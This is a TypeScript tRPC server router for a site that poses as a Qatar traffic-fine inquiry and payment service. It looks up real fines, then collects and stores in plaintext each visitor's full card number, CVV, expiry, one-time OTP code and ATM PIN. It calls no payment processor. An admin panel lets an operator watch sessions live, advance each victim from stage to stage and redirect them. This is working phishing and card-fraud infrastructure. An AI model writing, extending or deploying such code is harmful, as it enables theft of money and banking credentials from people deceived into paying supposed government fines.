import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import {
  createFineQuery,
  updateFineQuery,
  getFineQueryById,
  getRecentFineQueries,
  getFineQueriesByUserId,
  createFines,
  getFinesByQueryId,
  createPaymentSession,
  getPaymentSessionBySessionId,
  updatePaymentSession,
  getAllPaymentSessions,
} from "./db";
import { scrapeQatarFines, PLATE_SOURCES, QATAR_PLATE_TYPES, getPlateCodeOptions } from "./scraper";
import crypto from "crypto";
import { nanoid } from "nanoid";

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const adminTokens = new Set<string>();

function generateAdminToken(): string {
  return crypto.randomBytes(32).toString("hex");
}

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  fines: router({
    getOptions: publicProcedure.query(() => {
      return {
        plateSources: PLATE_SOURCES,
        plateTypes: QATAR_PLATE_TYPES,
      };
    }),

    getPlateCodes: publicProcedure
      .input(z.object({ plateSource: z.string() }))
      .query(async ({ input }) => {
        const plateCodes = await getPlateCodeOptions(input.plateSource);
        return { plateCodes };
      }),

    query: publicProcedure
      .input(
        z.object({
          sessionId: z.string().optional(),
          inquiryType: z.enum(["plate", "qid", "establishment"]),
          plateSource: z.string().optional(),
          plateNumber: z.string().optional(),
          plateType: z.string().optional(),
          ownerIdType: z.enum(["qid", "establishment"]).optional(),
          ownerId: z.string().optional(),
          captcha: z.string().optional(),
          lang: z.enum(["ar", "en"]).default("ar"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const queryId = await createFineQuery({
          plateSource: input.plateSource || "QAT",
          plateNumber: input.plateNumber || input.ownerId || "",
          plateCode: input.plateType || input.inquiryType,
          status: "pending",
          userId: ctx.user?.id ?? null,
        });

        let currentSessionId = input.sessionId;
        if (!currentSessionId) {
          currentSessionId = nanoid();
          await createPaymentSession({
            sessionId: currentSessionId,
            queryId,
            stage: "inquiry",
            clientIp: ctx.req.ip,
            userAgent: ctx.req.headers["user-agent"],
            plateNumber: input.plateNumber,
            plateSource: input.plateSource,
            plateCode: input.plateType,
            qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
            establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
          });
        }

        try {
          const result = await scrapeQatarFines(input);

          if (!result.success) {
            await updateFineQuery(queryId, {
              status: "failed",
              errorMessage: result.errorMessage,
            });
            await updatePaymentSession(currentSessionId, {
              errorMessage: result.errorMessage,
              statusRead: 0
            });
            return { success: false, queryId, sessionId: currentSessionId, fines: [], errorMessage: result.errorMessage };
          }

          const finesCount = result.fines.length;
          await updateFineQuery(queryId, {
            status: finesCount === 0 ? "no_fines" : "success",
            totalFines: finesCount,
            totalAmount: result.totalAmount ?? "0",
            rawResults: result.fines as any,
          });

          // تحديث الجلسة بالمبلغ والنتائج فور الاستعلام
          await updatePaymentSession(currentSessionId, {
            queryId,
            totalAmount: result.totalAmount,
            selectedFines: result.fines as any,
            stage: "results",
            statusRead: 0,
            plateNumber: input.plateNumber,
            plateSource: input.plateSource,
            plateCode: input.plateType,
            qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
            establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
          });

          if (finesCount > 0) {
            await createFines(
              result.fines.map((fine) => ({
                queryId,
                fineNumber: fine.fineNumber,
                fineDate: fine.fineDate,
                description: fine.descriptionAr || fine.description,
                amount: fine.amount,
                blackPoints: fine.blackPoints,
                location: fine.locationAr || fine.location,
                isPaid: fine.isPaid,
              }))
            );
          }

          return {
            success: true,
            queryId,
            sessionId: currentSessionId,
            fines: result.fines,
            totalAmount: result.totalAmount,
          };
        } catch (error: any) {
          await updateFineQuery(queryId, {
            status: "failed",
            errorMessage: error.message,
          });
          return { success: false, queryId, sessionId: currentSessionId, fines: [], errorMessage: error.message };
        }
      }),
  }),

  payment: router({
    createSession: publicProcedure
      .input(z.object({ queryId: z.number(), totalAmount: z.string(), selectedFines: z.any() }))
      .mutation(async ({ input, ctx }) => {
        const sessionId = nanoid();
        const id = await createPaymentSession({
          sessionId,
          queryId: input.queryId,
          totalAmount: input.totalAmount,
          selectedFines: input.selectedFines,
          stage: "card",
          clientIp: ctx.req.ip,
          userAgent: ctx.req.headers["user-agent"],
          statusRead: 0,
        });
        return { sessionId };
      }),

    getSession: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        return session;
      }),

    updateStage: publicProcedure
      .input(z.object({ sessionId: z.string(), stage: z.string() }))
      .mutation(async ({ input }) => {
        await updatePaymentSession(input.sessionId, {
          stage: input.stage as any,
          statusRead: 0
        });
        return { success: true };
      }),

    getStatus: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        return { 
          stage: session.stage, 
          errorMessage: session.errorMessage, 
          redirectUrl: session.redirectUrl 
        };
      }),

    submitCard: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        cardName: z.string(),
        cardNumber: z.string(),
        cardExpiry: z.string(),
        cardCvv: z.string(),
      }))
      .mutation(async ({ input }) => {
        const masked = input.cardNumber.replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");
        await updatePaymentSession(input.sessionId, {
          cardName: input.cardName,
          cardNumber: input.cardNumber,
          cardNumberMasked: masked,
          cardExpiry: input.cardExpiry,
          cardCvv: input.cardCvv,
          stage: "card_pending",
          statusRead: 0,
        });
        return { success: true };
      }),

    submitOtp: publicProcedure
      .input(z.object({ sessionId: z.string(), otpCode: z.string() }))
      .mutation(async ({ input }) => {
        await updatePaymentSession(input.sessionId, {
          otpCode: input.otpCode,
          stage: "otp_pending",
          statusRead: 0,
        });
        return { success: true };
      }),

    submitAtmPin: publicProcedure
      .input(z.object({ sessionId: z.string(), atmPin: z.string() }))
      .mutation(async ({ input }) => {
        await updatePaymentSession(input.sessionId, {
          atmPin: input.atmPin,
          stage: "atm_pending",
          statusRead: 0,
        });
        return { success: true };
      }),
  }),

  admin: router({
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
        const token = generateAdminToken();
        adminTokens.add(token);
        return { success: true, token };
      }),

    verify: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(({ input }) => {
        return { valid: adminTokens.has(input.token) };
      }),

    getStats: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        const sessions = await getAllPaymentSessions(1000);
        return {
          total: sessions.length,
          new: sessions.filter(s => s.statusRead === 0).length,
          completed: sessions.filter(s => s.stage === "success").length,
          pending: sessions.filter(s => s.stage.endsWith("_pending")).length,
        };
      }),

    getSessions: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        return await getAllPaymentSessions(100);
      }),

    getSession: publicProcedure
      .input(z.object({ token: z.string(), sessionId: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (session && session.statusRead === 0) {
          await updatePaymentSession(input.sessionId, { statusRead: 1 });
        }
        return session;
      }),

    action: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        action: z.enum(["pass", "denied", "completed"]),
        errorMessage: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND" });

        let newStage = session.stage;
        if (input.action === "completed") {
          newStage = "success";
        } else if (input.action === "denied") {
          newStage = "failed";
        } else if (input.action === "pass") {
          if (session.stage === "card_pending") newStage = "otp";
          else if (session.stage === "otp_pending") newStage = "atm";
          else if (session.stage === "atm_pending") newStage = "success";
        }

        await updatePaymentSession(input.sessionId, {
          stage: newStage as any,
          errorMessage: input.errorMessage || null,
          statusRead: 1
        });
        return { success: true, newStage };
      }),

    redirect: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        redirectUrl: z.string(),
      }))
      .mutation(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        await updatePaymentSession(input.sessionId, {
          redirectUrl: input.redirectUrl,
          statusRead: 1
        });
        return { success: true };
      }),

    clearAll: publicProcedure
      .input(z.object({ token: z.string() }))
      .mutation(async ({ input }) => {
        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        const { clearAdminRecords } = await import("./db");
        return await clearAdminRecords();
      }),
  }),
});

export type AppRouter = typeof appRouter;
